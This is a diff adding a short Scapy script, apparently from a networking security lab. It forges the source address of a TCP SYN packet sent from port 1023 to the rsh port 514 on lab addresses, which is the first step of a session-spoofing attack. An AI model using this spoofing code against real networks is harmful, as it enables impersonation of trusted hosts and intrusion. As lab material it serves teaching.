@@ -1,0 +1,9 @@
+#!/usr/bin/python3
+from scapy.all import *
+
+# spoof SYN from client to server
+ip = IP(src = "10.9.0.6", dst = "10.9.0.5")
+tcp = TCP(sport = 1023, dport = 514,
+            seq = 0x1000, flags = 'S')
+print('{} --> {} Sent SYN'.format(ip.src, ip.dst))
+send(ip/tcp, verbose = 0)
